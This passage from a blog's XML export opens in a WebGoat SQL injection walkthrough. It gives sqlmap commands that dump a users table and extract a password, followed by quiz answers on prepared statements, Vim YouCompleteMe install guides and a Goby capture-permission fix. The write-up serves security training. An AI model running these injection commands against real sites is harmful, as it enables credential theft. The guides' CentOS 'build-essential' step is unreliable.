<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -r webgoat_1.<span class="number">2.5</span>_register<span class="selector-class">.txt</span> <span class="attr">--string</span>=<span class="string">&quot;already exists please try to register with a different username&quot;</span> <span class="attr">--dbms</span>=HSQLDB <span class="attr">--thread</span> <span class="number">10</span> <span class="attr">--technique</span>=B -D PUBLIC -T SQL_CHALLENGE_USERS <span class="attr">--dump</span></span><br></pre></td></tr></table></figure>

<p>运行的时候才发现，这个数据库居然还是有快200行…那直接dump确实有点暴力了…(大笑)。有不少是运行SQLMap的时候自己注册进去的!!所以我们采用一个更有针对性的方法：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sqlmap -r webgoat_1.2.5_register.txt <span class="attribute">--string</span>=<span class="string">&quot;already exists please try to register with a different username&quot;</span> <span class="attribute">--dbms</span>=HSQLDB --thread 10 <span class="attribute">--technique</span>=B -D PUBLIC -T SQL_CHALLENGE_USERS <span class="attribute">--sql-query</span>=<span class="string">&quot;SELECT userid,password FROM SQL_CHALLENGE_USERS WHERE USERID=&#x27;tom&#x27;&quot;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="1_2_6.png"></p>
<p>顺利获得密码！登录即可。</p>
<blockquote>
<p>当然，这道题同样可以在password参数中爆破出密码，这里只是给出了一种完全使用SQLMap的思路。</p>
</blockquote>
<h3 id="Challenge-6"><a href="#Challenge-6" class="headerlink" title="Challenge 6"></a>Challenge 6</h3><p>最后是Quiz部分，总共五道选择题，全部做对视为通过。所有的题目都是关于 <strong>Prepared statement（预编译查询语句）</strong>。</p>
<ol>
<li>What is the difference between a prepared statement and a statement?</li>
</ol>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Solution <span class="number">4</span>: A <span class="keyword">statement</span> has got <span class="keyword">values</span> <span class="keyword">instead</span> <span class="keyword">of</span> a <span class="keyword">prepared</span> <span class="keyword">statement</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Which one of the following characters is a placeholder for variables?</li>
</ol>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Solution</span> <span class="number">3</span>: ?</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>How can prepared statements be faster than statements?</li>
</ol>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Solution <span class="number">2</span>: <span class="keyword">Prepared</span> statements are compiled once <span class="keyword">by</span> the <span class="keyword">database</span> management <span class="keyword">system</span> waitingfor <span class="keyword">input</span> <span class="keyword">and</span> are pre-compiled this way.</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>How can a prepared statement prevent SQL-Injection?</li>
</ol>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Solution <span class="number">3</span>: Placeholders can prevent that <span class="keyword">the</span> users input gets attached <span class="built_in">to</span> <span class="keyword">the</span> SQL query resulting <span class="keyword">in</span> <span class="keyword">a</span> seperation <span class="keyword">of</span> code <span class="keyword">and</span> data.</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;– that has a prepared statement?</li>
</ol>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Solution <span class="number">4</span>: The <span class="keyword">database</span> registers <span class="string">&#x27;Robert&#x27;</span> ); <span class="keyword">DROP</span> <span class="keyword">TABLE</span> Students;<span class="comment">--&#x27;.</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Security</category>
        <category>Web Application</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>WebGoat</tag>
        <tag>OWASP Top10</tag>
        <tag>SQLMap</tag>
        <tag>SQL Injection</tag>
      </tags>
  </entry>
  <entry>
    <title>YouCompleteMe 安装教程</title>
    <url>/zh-CN/d2b4abf1/</url>
    <content><![CDATA[<p>YouCompleteMe作为Vim中最好用（没有之一）的代码自动补全插件，却同时又是最不容易安装的插件之一。其实在YCM的Github官网，有非常详细完整的安装说明。如果在Mac OS X, Windows, Ubuntu, FreeBSD&#x2F;OpenBSD或Fedora上安装YCM，且英语还Okay的话，建议直接移步<a href="https://github.com/Valloric/YouCompleteMe#installation">官方安装说明文档</a>。但官方说明文档却没有对在CentOS与Debian中安装YCM的详细说明。所以在这里总结一下具体的步骤给大家作一个参考。</p>
<h1 id="在CentOS中安装YCM"><a href="#在CentOS中安装YCM" class="headerlink" title="在CentOS中安装YCM"></a>在CentOS中安装YCM</h1><h2 id="使用-Vundle-安装YCM"><a href="#使用-Vundle-安装YCM" class="headerlink" title="使用 Vundle 安装YCM"></a>使用 <a href="https://github.com/VundleVim/Vundle.vim">Vundle</a> 安装YCM</h2><p>Vundle（Vim Bundle的缩写）是一个针对Vim的插件管理器。相较于Vim本身混乱的插件结构，使用Vundle来管理插件就显得非常得方便、简洁。用户只需要在Github上找到自己想要的插件的名字，并将其添加到.vimrc文件中，之后的安装，更新和卸载等操作都可以由vundle来完成了。</p>
<span id="more"></span>
<ol>
<li>下载Vundle <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/VundleVim/</span>Vundle.vim.git ~<span class="regexp">/.vim/</span>bundle/Vundle.vim</span><br></pre></td></tr></table></figure></li>
<li>编辑 .vimrc 文件<br> 将以下代码添加至你的.vimrc文件中。同时，你也可以根据需求来添加其他你想要安装的vim插件。 <figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> nocompatible              <span class="comment">&quot; be iMproved, required</span></span><br><span class="line"><span class="keyword">filetype</span> off                  <span class="comment">&quot; required</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; set the runtime path to include Vundle and initialize</span></span><br><span class="line"><span class="keyword">set</span> rtp+=~/.<span class="keyword">vim</span>/bundle/Vundle.<span class="keyword">vim</span></span><br><span class="line"><span class="keyword">call</span> vundle#begin()</span><br><span class="line"><span class="comment">&quot; alternatively, pass a path where Vundle should install plugins</span></span><br><span class="line"><span class="comment">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; let Vundle manage Vundle, required</span></span><br><span class="line">Plugin <span class="string">&#x27;VundleVim/Vundle.vim&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; The following are examples of different formats supported.</span></span><br><span class="line"><span class="comment">&quot; Keep Plugin commands between vundle#begin/end.</span></span><br><span class="line"><span class="comment">&quot; plugin on GitHub repo</span></span><br><span class="line">Plugin <span class="string">&#x27;Valloric/YouCompleteMe&#x27;</span></span><br><span class="line"><span class="comment">&quot; plugin from http://vim-scripts.org/vim/scripts.html</span></span><br><span class="line"><span class="comment">&quot; Plugin &#x27;L9&#x27;</span></span><br><span class="line"><span class="comment">&quot; Git plugin not hosted on GitHub</span></span><br><span class="line"><span class="comment">&quot;Plugin &#x27;git://git.wincent.com/command-t.git&#x27;</span></span><br><span class="line"><span class="comment">&quot; git repos on your local machine (i.e. when working on your own plugin)</span></span><br><span class="line"><span class="comment">&quot;Plugin &#x27;file:///home/gmarik/path/to/plugin&#x27;</span></span><br><span class="line"><span class="comment">&quot; The sparkup vim script is in a subdirectory of this repo called vim.</span></span><br><span class="line"><span class="comment">&quot; Pass the path to set the runtimepath properly.</span></span><br><span class="line"><span class="comment">&quot;Plugin &#x27;rstacruz/sparkup&#x27;, &#123;&#x27;rtp&#x27;: &#x27;vim/&#x27;&#125;</span></span><br><span class="line"><span class="comment">&quot; Install L9 and avoid a Naming conflict if you&#x27;ve already installed a</span></span><br><span class="line"><span class="comment">&quot; different version somewhere else.</span></span><br><span class="line"><span class="comment">&quot; Plugin &#x27;ascenator/L9&#x27;, &#123;&#x27;name&#x27;: &#x27;newL9&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; All of your Plugins must be added before the following line</span></span><br><span class="line"><span class="keyword">call</span> vundle#end()            <span class="comment">&quot; required</span></span><br><span class="line"><span class="keyword">filetype</span> plugin <span class="built_in">indent</span> <span class="keyword">on</span>    <span class="comment">&quot; required</span></span><br><span class="line"><span class="comment">&quot; To ignore plugin indent changes, instead use:</span></span><br><span class="line"><span class="comment">&quot;filetype plugin on</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot; Brief help</span></span><br><span class="line"><span class="comment">&quot; :PluginList       - lists configured plugins</span></span><br><span class="line"><span class="comment">&quot; :PluginInstall    - installs plugins; append `!` to update or just :PluginUpdate</span></span><br><span class="line"><span class="comment">&quot; :PluginSearch foo - searches for foo; append `!` to refresh local cache</span></span><br><span class="line"><span class="comment">&quot; :PluginClean      - confirms removal of unused plugins; append `!` to auto-approve removal</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot; see :h vundle for more details or wiki for FAQ</span></span><br><span class="line"><span class="comment">&quot; Put your non-Plugin stuff after this line</span></span><br></pre></td></tr></table></figure></li>
<li>安装插件<br> 打开Vim并运行<code>:PluginInstall</code>指令。<br> 这一步骤可能所需要的时间较长，需要耐心地等待它安装完成。</li>
</ol>
<h2 id="安装编译YCM所需要的软件"><a href="#安装编译YCM所需要的软件" class="headerlink" title="安装编译YCM所需要的软件"></a>安装编译YCM所需要的软件</h2><ol>
<li>安装开发工具与CMake:<br> <figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">yum <span class="keyword">install </span><span class="keyword">build-essential </span>cmake</span><br></pre></td></tr></table></figure></li>
<li>并确保python头文件包已经正确安装:<br> <figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">yum install <span class="keyword">python</span>-devel rh-python36-<span class="keyword">python</span>-devel.x86_64</span><br></pre></td></tr></table></figure><br><img data-src="YCM1.PNG" alt="image1"><br> 如果你的CentOS上还未安装Python3，那么运行以下命令完成Python3.6的安装:<br> <figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">sudo yum <span class="keyword">install </span>centos-release-<span class="keyword">scl</span></span><br><span class="line"><span class="keyword"></span>sudo yum <span class="keyword">install </span>rh-python36</span><br></pre></td></tr></table></figure><br><br> 需要的话，可以将Python3.6作为默认的Python来运行：<br> <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">scl <span class="built_in">enable</span> rh-python36 bash</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="编译YCM"><a href="#编译YCM" class="headerlink" title="编译YCM"></a>编译YCM</h2><ul>
<li><p>完成包含对C语言家族语义支持的YCM编译</p>
  <figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~<span class="string">/.vim/bundle/YouCompleteMe</span></span><br><span class="line"><span class="string">./install.py</span> <span class="params">--clang-completer</span></span><br></pre></td></tr></table></figure></li>
<li><p>不包含语义支持则直接运行install.py</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.vim/bundle/YouCompleteMe</span><br><span class="line">./install.py</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果需要简单的开启对所有语言的支持，则可以用–all标识。</p>
  <figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~<span class="string">/.vim/bundle/YouCompleteMe</span></span><br><span class="line"><span class="string">./install.py</span> <span class="params">--all</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul>
<li><a href="https://github.com/Valloric/YouCompleteMe#full-installation-guide">https://github.com/Valloric/YouCompleteMe#full-installation-guide</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
        <category>Vim</category>
      </categories>
      <tags>
        <tag>Vim</tag>
        <tag>Vundle</tag>
        <tag>CentOS</tag>
        <tag>YCM</tag>
      </tags>
  </entry>
  <entry>
    <title>YouCompleteMe Installation</title>
    <url>/en/126f49de/</url>
    <content><![CDATA[<p>Acutally, there’re pretty detailed instructions for installation on YCM(YouCompleteMe)’s github page. However, the installation steps on CentOS and Debian cannot be found. </p>
<h1 id="Complete-YCM-Installation-on-CentOS"><a href="#Complete-YCM-Installation-on-CentOS" class="headerlink" title="Complete YCM Installation on CentOS"></a>Complete YCM Installation on CentOS</h1><h2 id="Install-YCM-with-Vundle"><a href="#Install-YCM-with-Vundle" class="headerlink" title="Install YCM with Vundle"></a>Install YCM with <a href="https://github.com/VundleVim/Vundle.vim">Vundle</a></h2><p>Vundle is a Plugin Manager for Vim. It provides an easy way to install, update and configure Vim Plugins.     </p>
<span id="more"></span>
<ol>
<li>Download Vundle <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/VundleVim/</span>Vundle.vim.git ~<span class="regexp">/.vim/</span>bundle/Vundle.vim</span><br></pre></td></tr></table></figure></li>
<li>Edit .vimrc<br> Put the following scripts in your .vimrc. You can also add other Plugins. <figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">       <span class="keyword">set</span> nocompatible              <span class="comment">&quot; be iMproved, required</span></span><br><span class="line"><span class="keyword">filetype</span> off                  <span class="comment">&quot; required</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; set the runtime path to include Vundle and initialize</span></span><br><span class="line"><span class="keyword">set</span> rtp+=~/.<span class="keyword">vim</span>/bundle/Vundle.<span class="keyword">vim</span></span><br><span class="line"><span class="keyword">call</span> vundle#begin()</span><br><span class="line"><span class="comment">&quot; alternatively, pass a path where Vundle should install plugins</span></span><br><span class="line"><span class="comment">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; let Vundle manage Vundle, required</span></span><br><span class="line">Plugin <span class="string">&#x27;VundleVim/Vundle.vim&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; The following are examples of different formats supported.</span></span><br><span class="line"><span class="comment">&quot; Keep Plugin commands between vundle#begin/end.</span></span><br><span class="line"><span class="comment">&quot; plugin on GitHub repo</span></span><br><span class="line">Plugin <span class="string">&#x27;Valloric/YouCompleteMe&#x27;</span></span><br><span class="line"><span class="comment">&quot; plugin from http://vim-scripts.org/vim/scripts.html</span></span><br><span class="line"><span class="comment">&quot; Plugin &#x27;L9&#x27;</span></span><br><span class="line"><span class="comment">&quot; Git plugin not hosted on GitHub</span></span><br><span class="line"><span class="comment">&quot;Plugin &#x27;git://git.wincent.com/command-t.git&#x27;</span></span><br><span class="line"><span class="comment">&quot; git repos on your local machine (i.e. when working on your own plugin)</span></span><br><span class="line"><span class="comment">&quot;Plugin &#x27;file:///home/gmarik/path/to/plugin&#x27;</span></span><br><span class="line"><span class="comment">&quot; The sparkup vim script is in a subdirectory of this repo called vim.</span></span><br><span class="line"><span class="comment">&quot; Pass the path to set the runtimepath properly.</span></span><br><span class="line"><span class="comment">&quot;Plugin &#x27;rstacruz/sparkup&#x27;, &#123;&#x27;rtp&#x27;: &#x27;vim/&#x27;&#125;</span></span><br><span class="line"><span class="comment">&quot; Install L9 and avoid a Naming conflict if you&#x27;ve already installed a</span></span><br><span class="line"><span class="comment">&quot; different version somewhere else.</span></span><br><span class="line"><span class="comment">&quot; Plugin &#x27;ascenator/L9&#x27;, &#123;&#x27;name&#x27;: &#x27;newL9&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; All of your Plugins must be added before the following line</span></span><br><span class="line"><span class="keyword">call</span> vundle#end()            <span class="comment">&quot; required</span></span><br><span class="line"><span class="keyword">filetype</span> plugin <span class="built_in">indent</span> <span class="keyword">on</span>    <span class="comment">&quot; required</span></span><br><span class="line"><span class="comment">&quot; To ignore plugin indent changes, instead use:</span></span><br><span class="line"><span class="comment">&quot;filetype plugin on</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot; Brief help</span></span><br><span class="line"><span class="comment">&quot; :PluginList       - lists configured plugins</span></span><br><span class="line"><span class="comment">&quot; :PluginInstall    - installs plugins; append `!` to update or just :PluginUpdate</span></span><br><span class="line"><span class="comment">&quot; :PluginSearch foo - searches for foo; append `!` to refresh local cache</span></span><br><span class="line"><span class="comment">&quot; :PluginClean      - confirms removal of unused plugins; append `!` to auto-approve removal</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot; see :h vundle for more details or wiki for FAQ</span></span><br><span class="line"><span class="comment">&quot; Put your non-Plugin stuff after this line</span></span><br></pre></td></tr></table></figure></li>
<li>Plugin Install<br> Launch vim and run <code>:PluginInstall</code><br> Please be patient. It could take a while to complete the installation.</li>
</ol>
<h2 id="Install-Dependencies-for-Compiling"><a href="#Install-Dependencies-for-Compiling" class="headerlink" title="Install Dependencies for Compiling"></a>Install Dependencies for Compiling</h2><ol>
<li>Install development tools and CMake: <figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">yum <span class="keyword">install </span><span class="keyword">build-essential </span>cmake</span><br></pre></td></tr></table></figure></li>
<li>Make sure you have Python headers installed:<br> <figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">yum install <span class="keyword">python</span>-devel rh-python36-<span class="keyword">python</span>-devel.x86_64</span><br></pre></td></tr></table></figure><br><img data-src="YCM1.PNG" alt="image1"><br> In case python3 is not installed on your CentOS:<br> Enable Software Collections: <figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">sudo yum install centos-release-scl</span><br></pre></td></tr></table></figure>
 Install Python3: <figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">sudo yum <span class="keyword">install</span> rh-python36</span><br></pre></td></tr></table></figure>
 If you want to use python 3.6 as default <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">scl <span class="built_in">enable</span> rh-python36 bash</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Compile-YCM"><a href="#Compile-YCM" class="headerlink" title="Compile YCM"></a>Compile YCM</h2><ul>
<li>Compiling YCM with semantic support for C-family languages:<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~<span class="string">/.vim/bundle/YouCompleteMe</span></span><br><span class="line"><span class="string">./install.py</span> <span class="params">--clang-completer</span></span><br></pre></td></tr></table></figure></li>
<li>Compiling YCM without semantic support for C-family languages:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.vim/bundle/YouCompleteMe</span><br><span class="line">./install.py</span><br></pre></td></tr></table></figure></li>
<li>To simply compile with everything enabled, there’s a –all flag.	<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~<span class="string">/.vim/bundle/YouCompleteMe</span></span><br><span class="line"><span class="string">./install.py</span> <span class="params">--all</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="Referrence"><a href="#Referrence" class="headerlink" title="Referrence"></a>Referrence</h1><ul>
<li><a href="https://github.com/Valloric/YouCompleteMe#full-installation-guide">https://github.com/Valloric/YouCompleteMe#full-installation-guide</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
        <category>Vim</category>
      </categories>
      <tags>
        <tag>Vim</tag>
        <tag>Vundle</tag>
        <tag>CentOS</tag>
        <tag>YCM</tag>
      </tags>
  </entry>
  <entry>
    <title>Goby - &quot;You Don&#39;t Have Permission to Capture on This Device&quot; Issue</title>
    <url>/en-US/7f89c159/</url>
    <content><![CDATA[<span id="more"></span>




<p>Try to run Goby as root, got the following error message: </p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">[<span class="number">0708</span>/<span class="number">184710.807452</span>:FATAL:electron_main_delegate.<span class="keyword">cc</span>(<span class="number">290</span>)] Running <span class="keyword">as</span> root without --<span class="keyword">no</span>-<span class="keyword">sandbox</span> <span class="keyword">is</span> not supported. See https://crbug.<span class="keyword">com</span>/<span class="number">638180</span>.</span><br></pre></td></tr></table></figure>
<p><img data-src="./error_message.png"></p>
<p>If running Goby without root, then there will be an error message asking for NIC permission.</p>
<p>~<a href="./no_permission.png"></a></p>
<p>And when launching a new scan, it failed with an error message:</p>
<p><img data-src="./error_message1.png"></p>
<p>And it’s still not working even following the instruction to add current user to root group. What’s wrong? </p>
<p>Here’s how to solve this issue: </p>
<p>First add a capture group <code>pcap</code> and then add current user to this group:</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">sudo groupadd pcap</span><br><span class="line">sudo usermod -<span class="selector-tag">a</span> -G pcap richard</span><br></pre></td></tr></table></figure>

<p><img data-src="add_group.png"></p>
<p>Next, change the group of tcpdump and set permissions:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo chgrp pcap <span class="regexp">/usr/</span>bin/tcpdump</span><br><span class="line">sudo chmod <span class="number">750</span> <span class="regexp">/usr/</span>bin/tcpdump</span><br></pre></td></tr></table></figure>

<p><img data-src="change_permission.png"></p>
<p>Add permission</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo setcap cap_net_raw,cap_net_admin=eip <span class="regexp">/usr/</span>bin/tcpdump</span><br><span class="line">sudo setcap cap_net_raw,cap_net_bind_service=+eip .<span class="regexp">/golib/g</span>oby-cmd-linux</span><br></pre></td></tr></table></figure>

<p>Then check again in Goby. Now everything works well.<br><img data-src="./succeed.png"></p>
]]></content>
      <categories>
        <category>Security</category>
        <category>Web Application</category>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>Goby</tag>
        <tag>Attack Surface Mapping</tag>
      </tags>
  </entry>
</search>
